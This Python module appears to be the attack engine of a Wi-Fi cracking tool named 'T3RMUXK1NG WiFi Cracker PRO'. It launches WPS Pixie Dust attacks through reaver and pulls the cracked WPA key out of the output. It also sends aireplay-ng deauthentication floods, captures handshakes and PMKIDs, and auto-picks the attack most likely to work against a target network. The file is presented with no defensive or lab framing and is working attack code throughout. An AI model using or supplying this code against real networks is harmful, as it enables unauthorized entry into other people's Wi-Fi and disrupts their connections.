#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""T3RMUXK1NG WiFi Cracker PRO v4.0 - Attack Engine Module"""

import os
import sys
import re
import time
import threading
import subprocess
from enum import Enum
from typing import List, Dict, Optional
from dataclasses import dataclass
from pathlib import Path

sys.path.insert(0, str(Path(__file__).parent.parent))
from core.types import WiFiNetwork, AttackResult
from utils.logger import Logger

logger = Logger('Attacker')


class AttackType(Enum):
    HANDSHAKE = "handshake"
    PMKID = "pmkid"
    WPS_PIXIE = "wps_pixie"
    WPS_BRUTE = "wps_brute"
    EVIL_TWIN = "evil_twin"
    DEAUTH = "deauth"
    KARMA = "karma"
    MITM = "mitm"
    WEP = "wep"


class AttackStatus(Enum):
    PENDING = "pending"
    RUNNING = "running"
    SUCCESS = "success"
    FAILED = "failed"
    STOPPED = "stopped"


class AttackEngine:
    """Unified Attack Orchestration Engine"""
    
    def __init__(self, interface: str):
        self.interface = interface
        self.attacks: Dict[str, threading.Thread] = {}
        self.results: Dict[str, AttackResult] = {}
        self.running = False
        self.stats = {
            'attacks_launched': 0,
            'attacks_successful': 0,
            'passwords_cracked': 0
        }
    
    def launch(self, attack_type: AttackType, target: WiFiNetwork,
               options: Dict = None) -> str:
        """Launch an attack"""
        attack_id = f"{attack_type.value}_{target.bssid}_{int(time.time())}"
        options = options or {}
        
        def _run():
            start_time = time.time()
            result = AttackResult(
                attack_type=attack_type.value,
                status=AttackStatus.RUNNING.value,
                target=target.bssid
            )
            
            try:
                if attack_type == AttackType.HANDSHAKE:
                    result = self._attack_handshake(target, options)
                elif attack_type == AttackType.WPS_PIXIE:
                    result = self._attack_wps_pixie(target, options)
                elif attack_type == AttackType.DEAUTH:
                    result = self._attack_deauth(target, options)
                elif attack_type == AttackType.PMKID:
                    result = self._attack_pmkid(target, options)
                
                result.time_taken = time.time() - start_time
                
                if result.success:
                    self.stats['attacks_successful'] += 1
                    if result.password:
                        self.stats['passwords_cracked'] += 1
            
            except Exception as e:
                result.success = False
                result.error = str(e)
            
            self.results[attack_id] = result
        
        thread = threading.Thread(target=_run, daemon=True)
        thread.start()
        self.attacks[attack_id] = thread
        self.stats['attacks_launched'] += 1
        
        return attack_id
    
    def _attack_handshake(self, target: WiFiNetwork, options: Dict) -> AttackResult:
        """Handshake capture attack"""
        from core.capturer import HandshakeCapturer
        capturer = HandshakeCapturer(self.interface)
        result = capturer.capture(target, options.get('duration', 120), options.get('deauth', True))
        
        return AttackResult(
            success=result.success, attack_type='handshake',
            target=target.bssid, cap_file=result.cap_file, error=result.error
        )
    
    def _attack_wps_pixie(self, target: WiFiNetwork, options: Dict) -> AttackResult:
        """WPS Pixie Dust attack"""
        try:
            cmd = ['sudo', 'reaver', '-i', self.interface, '-b', target.bssid, '-vv', '-K']
            process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
            output, _ = process.communicate(timeout=300)
            
            if 'WPA PSK' in output:
                match = re.search(r'WPA PSK:\s*[\'"]?([^\s\'"]+)', output)
                if match:
                    return AttackResult(success=True, attack_type='wps_pixie',
                                       target=target.bssid, password=match.group(1))
            
            return AttackResult(success=False, attack_type='wps_pixie',
                               target=target.bssid, error="Pixie Dust failed")
        except Exception as e:
            return AttackResult(success=False, attack_type='wps_pixie',
                               target=target.bssid, error=str(e))
    
    def _attack_deauth(self, target: WiFiNetwork, options: Dict) -> AttackResult:
        """Deauth attack"""
        count = options.get('count', 10)
        try:
            cmd = ['sudo', 'aireplay-ng', '--deauth', str(count), '-a', target.bssid, self.interface]
            subprocess.run(cmd, capture_output=True, timeout=30)
            return AttackResult(success=True, attack_type='deauth', target=target.bssid)
        except Exception as e:
            return AttackResult(success=False, attack_type='deauth',
                               target=target.bssid, error=str(e))
    
    def _attack_pmkid(self, target: WiFiNetwork, options: Dict) -> AttackResult:
        """PMKID attack"""
        from core.capturer import HandshakeCapturer
        capturer = HandshakeCapturer(self.interface)
        result = capturer.capture_pmkid(target, options.get('timeout', 60))
        
        return AttackResult(
            success=result.success, attack_type='pmkid',
            target=target.bssid, cap_file=result.cap_file, error=result.error
        )
    
    def launch_auto(self, target: WiFiNetwork) -> str:
        """Auto-select best attack"""
        if target.wps and not target.wps_locked:
            return self.launch(AttackType.WPS_PIXIE, target)
        if 'WPA' in target.encryption:
            return self.launch(AttackType.PMKID, target)
        return self.launch(AttackType.HANDSHAKE, target)
    
    def stop(self, attack_id: str = None):
        self.running = False
    
    def get_status(self, attack_id: str) -> Optional[AttackResult]:
        return self.results.get(attack_id)
    
    def get_all_results(self) -> Dict[str, AttackResult]:
        return self.results.copy()
    
    def get_stats(self) -> Dict:
        return self.stats.copy()
